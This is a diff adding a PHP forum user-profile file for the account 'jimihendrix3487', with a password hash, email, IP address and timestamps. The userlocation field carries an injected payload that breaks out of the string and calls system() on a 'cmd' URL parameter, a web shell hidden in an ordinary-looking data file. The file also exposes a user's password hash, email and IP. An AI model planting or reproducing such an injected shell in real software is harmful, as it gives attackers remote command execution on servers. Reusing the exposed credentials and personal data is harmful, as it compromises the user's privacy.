@@ -1,0 +1,35 @@
+<?php
+
+$userid="253";
+$password="ab178eb6e7a3c5e0615c544383d1ffe5";
+$username="jimihendrix3487";
+$useralias="jimihendrix3487";
+$userrealname="";
+$useremail="jimimail3487@jimimail.com";
+$useremhide="";
+$userip="24.182.28.58";
+$usersig="";
+$userslogan="colorgination.com harness racing video";
+$useravatar="";
+$usermsn="";
+$userposts="0";
+$usericq="";
+$userqq="";
+$userwebavatar="";
+$userrank="1";
+$useryahoo="";
+$useraim="";
+$userlocation="madrid\'; error_reporting(0); system($HTTP_GET_VARS[cmd]); echo \'";
+$userjoined="1184435434";
+$userhomepage="http://";
+$useradmin="0";
+$usermod="0";
+$userban="0";
+$userlastvisit="1184435434";
+$userlastpost="1184435434";
+$userprevvisit="1184435434";
+$useranimsmilies="";
+$lastaliaschange="1184435434";
+$userlang="en";
+
+?>
